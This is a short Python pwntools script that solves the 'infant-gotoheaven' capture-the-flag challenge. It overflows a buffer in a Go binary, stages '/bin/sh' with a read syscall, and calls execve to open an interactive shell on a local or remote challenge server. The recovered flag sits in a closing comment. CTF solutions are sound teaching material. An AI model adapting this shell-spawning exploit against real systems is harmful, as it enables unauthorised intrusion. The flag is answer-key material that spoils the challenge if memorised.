#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

if "remote" in sys.argv:
    r = remote("bamboofox.cs.nctu.edu.tw", 58796)
else:
    r = process("./infant-gotoheaven")

elf = ELF("./infant-gotoheaven")

syscall = 0x46A3F0
leave = 0x45571d

r.recvline()
r.sendline(flat("A" * 216, 
    0x55C368, # rbp
    syscall, leave, 0, 0, 0x55C360, 1024, # syscall(0, stdin, buf, 1024)
    ))

sleep(0.1)

r.sendline(flat("/bin/sh\x00", 0,
    syscall, 0, 59, 0x55C360, 0, 0 # syscall(59, buf, 0, 0)
    ))

r.interactive()

# BAMBOOFOX{GOLANG_PWnnnnnnnIng_iS_r3A11Y_W3iRdO_O}
